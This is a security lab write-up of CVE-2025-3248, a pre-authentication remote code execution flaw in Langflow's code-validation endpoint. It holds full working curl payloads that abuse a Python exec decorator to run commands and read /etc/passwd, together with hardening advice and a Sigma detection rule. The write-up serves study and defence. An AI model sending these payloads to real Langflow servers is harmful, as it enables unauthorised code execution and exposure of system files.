# CVE-2025-3248 — Langflow validate/code API Pre-Auth Remote Code Execution

## 1. Overview

| Field | Value |
|-------|-------|
| CVE | CVE-2025-3248 |
| Product | Langflow < 1.3.0 |
| Attack Vector | Network (Pre-Auth, single POST request) |
| Impact | Remote Code Execution (command output in response) |
| CVSS 3.1 | 9.8 Critical |
| Patch | 1.3.0 |

Langflow is a popular open-source tool for building agentic AI workflows. Its `/api/v1/validate/code` endpoint parses user-submitted Python code with the `ast` module and executes function definitions using `exec()`. However, Python decorators and default argument expressions are evaluated at function definition time. An attacker can inject arbitrary code via a malicious decorator (`@exec(...)`), achieving pre-auth RCE with command output returned in the response.

## 2. Attack Chain

```
Recon: Identify Langflow on port 7860
  └─▶ Craft: Python function with @exec() decorator containing subprocess call
      └─▶ Deliver: POST /api/v1/validate/code (no auth required)
          └─▶ Impact: RCE as root, output in JSON response errors field
```

## 3. Reproduction

### Environment

```bash
cd ~/Security/tools/vulhub/langflow/CVE-2025-3248
docker compose up -d
# Langflow 1.2.0 on port 7860, wait ~30s for startup
```

### Step 1 — Pre-Auth RCE via Python Decorator

```bash
curl -s -X POST http://localhost:7860/api/v1/validate/code \
  -H "Content-Type: application/json" \
  -d '{"code": "@exec(\"raise Exception(__import__('"'"'subprocess'"'"').check_output(['"'"'id'"'"']))\")\ndef foo():\n  pass"}'
```

Response (command output in error field):
```json
{
  "imports": {"errors": []},
  "function": {"errors": ["b'uid=0(root) gid=0(root) groups=0(root)\\n'"]}
}
```

### Step 2 — Payload Breakdown

```python
@exec("raise Exception(__import__('subprocess').check_output(['id']))")
def foo():
    pass
```

Python evaluates decorators at function definition time. The `@exec(...)` decorator:
1. Calls `exec()` with the string argument
2. Inside, `__import__('subprocess').check_output(['id'])` runs the command
3. `raise Exception(...)` surfaces the output in the error response

### Step 3 — Verify Arbitrary Command Execution

```bash
curl -s -X POST http://localhost:7860/api/v1/validate/code \
  -H "Content-Type: application/json" \
  -d '{"code": "@exec(\"raise Exception(__import__('"'"'subprocess'"'"').check_output(['"'"'cat'"'"','"'"'/etc/passwd'"'"']))\")\ndef foo():\n  pass"}'
# Returns /etc/passwd content in error field
```

### Cleanup

```bash
docker compose down -v
```

## 4. Lessons Learned

- **`exec()` on user code is inherently unsafe**: Even with `ast` module pre-parsing, Python's evaluation semantics (decorators, default args) execute code at definition time.
- **AI/LLM tooling is a new attack surface**: Langflow, LangChain, and similar tools often have code execution features that are poorly secured.
- **Pre-auth + output in response = trivial exploitation**: No blind techniques needed — command output comes back directly in JSON.
- **Decorator abuse is a Python-specific primitive**: Unlike traditional injection, this exploits a language feature that runs code as a side effect of defining a function.

## 5. Defense

### 5.1 Hardening

| Layer | Action |
|-------|--------|
| Application | Upgrade to Langflow ≥ 1.3.0 |
| API | Require authentication for `/api/v1/validate/code`; rate-limit the endpoint |
| Sandboxing | Execute code validation in a restricted subprocess (seccomp, no network, read-only fs) |
| Network | Never expose Langflow to the internet; restrict to internal dev networks |
| Container | Run as non-root, drop all capabilities, read-only rootfs |

### 5.2 Detection (SIEM / WAF Rules)

```yaml
# Sigma rule — Langflow code validation RCE
title: Langflow CVE-2025-3248 Pre-Auth RCE
logsource:
  category: webserver
detection:
  selection:
    cs-uri-stem: '/api/v1/validate/code'
    cs-method: 'POST'
  keywords:
    cs-body|contains:
      - '__import__'
      - 'subprocess'
      - '@exec'
      - 'check_output'
      - 'os.system'
  condition: selection and keywords
  level: critical
```

### 5.3 Threat Hunting

| Hypothesis | Data Source | Query Logic |
|------------|-------------|-------------|
| Code injection attempted | WAF / access logs | POST to `/api/v1/validate/code` with `__import__`, `subprocess`, `exec` in body |
| Successful RCE | Application logs | Response errors containing OS command output patterns |
| Post-exploitation | EDR / process tree | Python process spawning shell commands (sh, bash, curl, wget) |
| Data exfiltration | Network flows | Langflow container making outbound connections to unknown IPs |

## 6. Tools & References

| Tool | Purpose |
|------|---------|
| curl | Single POST request exploit with output |
| docker / vulhub | Local vulnerable environment |

- [Horizon3.ai — Unsafe at Any Speed: Langflow RCE](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [NVD — CVE-2025-3248](https://nvd.nist.gov/vuln/detail/CVE-2025-3248)
- [Langflow 1.3.0 Release Notes](https://github.com/langflow-ai/langflow/releases/tag/1.3.0)

## 7. Disclaimer

This reproduction was performed in an isolated Docker environment (vulhub) on localhost for educational purposes only. No production systems were targeted. The goal is to understand the vulnerability mechanism and develop effective detection/hardening strategies.
